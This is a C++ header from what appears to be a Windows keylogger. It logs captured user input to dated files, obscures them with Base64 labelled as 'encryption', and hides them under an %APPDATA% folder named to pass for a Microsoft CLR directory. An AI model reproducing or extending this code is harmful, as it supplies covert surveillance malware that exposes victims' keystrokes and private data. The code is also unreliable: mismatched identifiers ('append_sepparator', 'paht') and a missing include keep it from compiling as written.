#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO {

    // Method to get the path
    std::string GetOurPath (const bool append_sepparator = false) {
        // let's put the log files in the directory C:\Users\USERNAME\AppData\Roaming
        // getenv = get environment ;
        std::string appdata_dir (getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";

        return full + (append_separator ? "\\" : "");
    }

    /* Method for making a directory
     * (still, this function will fail if it doesn't have the full path,
     * because it will not be able to go through it */
    bool MKOneDr (std::string path) {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    // If the MKOneDr fails, we need this method to create a dir
    bool MKDir (std::string path) {
        for (char &c : path)
            if (c == '\\') {
                c = '\0';
                if (!MKOneDr (paht))
                    return false;
                c = '\\';
            }
        return true;
    }

    /* WriteLog method is a generic function which will write into a file
     * all the input it receives from the user. It will also format and name the log
     * with the current date and time on user's system. */
    template <class T>
    std::string WriteLog (const T * &t) {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString ("_") + ".log";

        try {
            std::ofstream file (path + name);
            if (!file)  return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;

            // Encrypt
            std::string data = Base64::EncryptB64 (s.str());

            // Output to the file
            file << data;

            if (!file) return "";
            file.close ();

            return name;
        } catch (...) {
            return "";
        }
    }
}

#endif
